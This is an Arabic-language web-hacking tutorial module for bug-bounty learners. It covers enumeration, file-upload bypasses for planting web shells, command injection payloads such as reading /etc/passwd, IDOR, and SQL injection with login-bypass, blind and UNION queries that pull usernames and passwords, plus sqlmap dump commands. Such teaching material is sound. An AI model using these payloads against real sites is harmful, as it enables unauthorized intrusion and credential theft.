Module 15 Hacker Mindset

🔍 أولاً: Enumeration الحقيقي (مش حفظ)

🧠 القاعدة الذهبية:

تعرف كل نقطة دخول في الموقع.. كل Input = Vulnerability محتملة.

1️⃣ Parameters

أهم نقطة هجوم للـ SQLi والـ IDOR.

?id=1
?user=admin
?page=home
2️⃣ Directories

المسارات المخفية اللي محدش المفروض يشوفها.

/admin
/upload
/api
3️⃣ Subdomains

أقسام الموقع الداخلية والتجريبية.

admin.site.com
dev.site.com

📂 1) File Upload (من أخطر الثغرات)

🧠 السيناريو الحقيقي:

الموقع بيسمحلك ترفع صورة ومفيش Validation محترم، تروح أنت رافع Web Shell عشان تنفذ أكواد على السيرفر (RCE).

🔥 الطرق الاحترافية للرفع (Bypassing):
  • تغيير الامتداد (Extension): shell.php.jpg عشان تخدع السيرفر.
  • استخدام MIME Bypass: تغيير الـ Content-Type في Burp Suite لـ image/jpeg.
  • رفع .php مباشرة لو السيكيورتي معدوم.
🎯 النتيجة: Remote Code Execution (RCE) 🔥

⚡ 2) Command Injection

🧠 الفكرة:

الموقع بينفذ أمر من مدخلاتك، وتقدر تفصل الأوامر وتدخل أمرك انت.

الموقع بيعمل كده:
ping 127.0.0.1
💣 الهجوم (الفصل بـ ; أو &&):
127.0.0.1; whoami
🧠 Payloads للمحترفين:
&& ls
| id
; cat /etc/passwd

🔓 3) IDOR (كنز الـ Bug Bounty)

🧠 الفكرة:

تغير ID → توصل لبيانات مش بتاعتك.

مثال:
/profile?id=100
💣 الهجوم:
/profile?id=101
🔥 الخطورة:

Data Leak, Account Takeover.
نصيحة: IDOR كنز بيجيب فلوس كتير في الـ Bug Bounty 💰.

⚠️ أخطاء ناس كتير بتقع فيها

  • حفظ Payloads واستخدامها بدون فهم ❌
  • تجاهل ثغرة IDOR والتركيز على الحاجات المعقدة بس ❌
  • الاعتماد على SQLMap بس وميعرفش يشتغل مانيوال ❌
  • عدم تجربة كل الـ Inputs اللي في الموقع ❌

💣 4) SQL Injection (أهم سلاح 🔥🔥🔥)

🧠 الفكرة الأساسية:

أنت بتكلم قاعدة البيانات (Database) مباشرة من خلال الـ Input بتاع الموقع.

🔥 1) Login Bypass
' OR 1=1 --
🧠 ليه شغال؟

لأن OR 1=1 = TRUE، فالشرط كله بيبقى TRUE وبيدخلك كأدمن مباشرة!

🕵️♂️ 2) Blind SQL Injection

مفيش Output مباشر، بس بتراقب فرق الرد (الصفحة بتفتح أو تتأخر).

' AND 1=1 -- (الصفحة تفتح)
' AND 1=2 -- (الصفحة تختلف)
🔥 3) UNION Attack (استخراج البيانات يدوي) الهدف: دمج query بتاعتك مع query السيرفر لتسريب الداتا.
استخراج الجداول:
' UNION SELECT table_name, NULL FROM information_schema.tables --
استخراج الأعمدة:
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
استخراج البيانات (Users & Passwords):
' UNION SELECT username, password FROM users --
🤖 4) SQLMap (الأداة القاتلة) Automation
جلب قواعد البيانات:
sqlmap -u "http://target.com?id=1" --dbs
جلب الجداول:
sqlmap -u "URL" -D dbname --tables
جلب البيانات:
sqlmap -u "URL" -D dbname -T users --dump

🧠 تذكر: SQLMap أداة Automation.. لكن لازم تفهم المانيوال الأول!
